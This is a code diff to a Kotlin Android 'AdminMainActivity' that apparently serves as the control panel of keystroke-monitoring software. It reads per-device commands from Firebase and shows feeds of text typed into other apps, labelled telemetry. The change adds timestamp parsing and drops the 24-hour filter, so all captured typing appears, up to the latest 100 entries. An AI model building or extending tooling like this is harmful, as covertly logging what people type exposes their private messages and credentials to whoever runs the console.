@@ -123,6 +123,15 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
+    private fun parseTimestamp(value: Any?): Long? {
+        return when (value) {
+            is Long -> value
+            is Number -> value.toLong()
+            is String -> value.toLongOrNull()
+            else -> null
+        }
+    }
+
     private fun listenToDeviceState(deviceName: String) {
         val cmdRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(deviceName)
         
@@ -206,7 +215,6 @@ class AdminMainActivity : AppCompatActivity() {
                 CoroutineScope(Dispatchers.IO).launch {
                     val entries = mutableListOf<Triple<Long, String, String>>()
                     val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
-                    val twentyFourHoursAgo = System.currentTimeMillis() - (24 * 60 * 60 * 1000L)
 
                     for (appChild in snapshot.children) {
                         val rawApp = appChild.key ?: continue
@@ -219,10 +227,9 @@ class AdminMainActivity : AppCompatActivity() {
                                 ?: entry.child("typedContent").getValue(String::class.java)
                                 ?: continue
 
-                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+                            val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
 
-                            // Filter: Last 24 hours only
-                            if (timestampMillis >= twentyFourHoursAgo && text.isNotBlank() && text != "null") {
+                            if (text.isNotBlank() && text != "null") {
                                 entries.add(Triple(timestampMillis, prettyApp, text))
                             }
                         }
@@ -231,7 +238,7 @@ class AdminMainActivity : AppCompatActivity() {
                     // Sort newest on top (latest first)
                     entries.sortByDescending { it.first }
 
-                    // Take latest 100 entries
+                    // Take latest 100 entries and display immediately
                     val cappedEntries = entries.take(100).joinToString("\n") { item ->
                         val timeStr = timeFormat.format(Date(item.first))
                         "[$timeStr] [${item.second}] ${item.third}"
@@ -240,7 +247,7 @@ class AdminMainActivity : AppCompatActivity() {
                     withContext(Dispatchers.Main) {
                         val index = deviceList.indexOfFirst { it.name == deviceName }
                         if (index != -1) {
-                            deviceList[index].logFeed = if (cappedEntries.isNotBlank()) cappedEntries else "No telemetry recorded in the last 24 hours."
+                            deviceList[index].logFeed = if (cappedEntries.isNotBlank()) cappedEntries else "No telemetry recorded yet."
                             adapter.notifyItemChanged(index)
                         }
                     }
